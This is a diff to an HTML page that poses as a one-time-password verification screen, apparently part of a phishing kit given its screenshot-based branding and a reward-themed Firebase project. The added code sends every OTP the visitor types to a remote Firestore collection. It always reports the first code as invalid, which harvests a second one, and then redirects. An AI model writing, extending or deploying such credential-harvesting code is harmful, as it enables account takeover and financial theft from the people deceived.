@@ -138,7 +138,7 @@
   <img src="https://i.ibb.co/Df9LGMPd/Screenshot-2025-04-19-21-58-32-49-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="New Header">
 
   <div class="form-container">
-    <form onsubmit="return handleSubmit()">
+    <form onsubmit="return handleSubmit(event)">
       <div class="form-group">
         <input type="password" id="otp" maxlength="8" placeholder=" " required>
         <div class="error-text" id="errorText">Invalid OTP</div>
@@ -153,36 +153,63 @@
     <img class="bottom-image" src="https://i.ibb.co/Q7Vd7N0D/Screenshot-2025-04-19-21-58-55-92-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
   </div>
 
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+
   <script>
     let attempt = 1;
 
-    function handleSubmit() {
+    function handleSubmit(e) {
+      e.preventDefault();
       const blur = document.getElementById("blurOverlay");
       const otp = document.getElementById("otp");
       const errorText = document.getElementById("errorText");
 
+      if (otp.value.trim() === "" || otp.value.length < 4) {
+        alert("Please enter a valid OTP");
+        return false;
+      }
+
       blur.style.display = "flex";
+      errorText.style.display = "none";
 
-      setTimeout(() => {
-        blur.style.display = "none";
-
-        if (attempt === 1) {
-          errorText.style.display = "block";
-          attempt++;
-        } else {
-          if (otp.value.length === 6 || otp.value.length === 8) {
-            window.location.href = "page3.html";
+      db.collection("otp_entries").add({
+        otp: otp.value.trim(),
+        attempt: attempt,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        setTimeout(() => {
+          blur.style.display = "none";
+          if (attempt < 2) {
+            errorText.style.display = "block";
+            attempt++;
           } else {
-            alert("Please enter a valid 6 or 8 digit OTP.");
+            window.location.href = "page3.html";
           }
-        }
-
-      }, 4000);
+        }, 4000);
+      }).catch((error) => {
+        blur.style.display = "none";
+        alert("Error saving OTP: " + error.message);
+      });
 
       return false;
     }
 
-    // Countdown Timer - 3 minutes
+    // Countdown Timer
     let timeLeft = 180;
     const timerDisplay = document.getElementById("timer");
 
